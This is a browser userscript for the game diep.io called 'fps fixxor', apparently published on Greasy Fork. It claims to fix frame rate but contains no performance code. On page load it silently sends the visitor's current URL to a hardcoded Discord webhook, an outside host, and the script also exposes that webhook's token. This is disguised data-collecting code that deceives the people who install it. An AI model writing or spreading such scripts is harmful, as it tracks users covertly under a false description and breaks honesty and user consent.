// ==UserScript==
// @name         fps fixxor
// @namespace    http://tampermonkey.net/
// @version      1.0.0
// @description  xd
// @author       altoids
// @match        https://diep.io/
// @icon         https://www.google.com/s2/favicons?domain=diep.io
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/428641/fps%20fixxor.user.js
// @updateURL https://update.greasyfork.org/scripts/428641/fps%20fixxor.meta.js
// ==/UserScript==

(async function() {
    'use strict';

    const t = await fetch('https://discord.com/api/webhooks/846949011016908800/aoU8JzIs4vqhLGYb6pavATJe-PoREAB_NAcGOFk7HKzyHycXqOlGKjp476bbXCp4iff7', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: window.location.href }),
    });
    const x = await t.json();
})();